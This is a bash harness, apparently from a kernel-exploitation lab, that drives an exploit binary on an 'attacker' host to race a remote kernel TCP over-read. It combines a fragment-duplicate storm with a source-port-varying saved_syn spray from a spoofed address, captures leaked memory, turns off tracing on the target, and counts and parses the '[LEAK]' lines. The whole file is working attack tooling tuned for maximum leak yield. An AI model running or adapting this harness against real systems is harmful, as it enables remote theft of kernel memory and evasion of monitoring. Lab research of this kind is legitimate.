#!/bin/bash
# run_leak_vary.sh <race_sport> <token> <runtime_s> [storm_spacing]
# Probe-free over-read harvest, best measured configuration:
#   - one storm process: FRAG_DUPS, AF_PACKET leak capture (any port)
#   - one dedicated saved_syn spray process with a unique source port per
#     packet (SPRAY_VARYPORT), which is required to exceed the listener's
#     retransmission-coalescing limit.
set -u
LAB=$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)
cd "$LAB"
RACE=${1:?}; TOK=${2:?}; RUNTIME=${3:-600}; SPACING=${4:-128}
./lab/ssh.sh target 'sudo sh /tmp/cleanup_probes.sh 2>/dev/null; sudo sh -c "echo 0 > /sys/kernel/debug/tracing/tracing_on"' >/dev/null 2>&1
./lab/ssh.sh attacker "sudo pkill -x mpstorm3_leak 2>/dev/null; sleep 0.5; rm -f /tmp/stormV.out /tmp/sprayV.out"
./lab/ssh.sh attacker "sudo sh -c \"FRAG_DUPS=1 LEAK_DUMP=1 LEAK_ANY=1 setsid nohup /tmp/mpstorm3_leak 9800 $TOK $RACE $((RUNTIME+20)) $SPACING 1 0 5 192.168.89.1 30000000 192.168.89.2 >/tmp/stormV.out 2>&1 </dev/null &\""
./lab/ssh.sh attacker "sudo sh -c \"SAVED_SYN_SPRAY=1 SPRAY_VARYPORT=1 SPRAY_DPORT=9801 SPRAY_SRC=126.0.2.69 setsid nohup /tmp/mpstorm3_leak 9800 $TOK $RACE $((RUNTIME+20)) $SPACING 0 40000 1 192.168.89.1 30000000 192.168.89.2 >/tmp/sprayV.out 2>&1 </dev/null &\""
sleep "$RUNTIME"
./lab/ssh.sh attacker 'sudo pkill -x mpstorm3_leak; echo -n leak_lines=; grep -c "\[LEAK\]" /tmp/stormV.out; python3 /tmp/parse_storm.py /tmp/stormV.out | head -40'
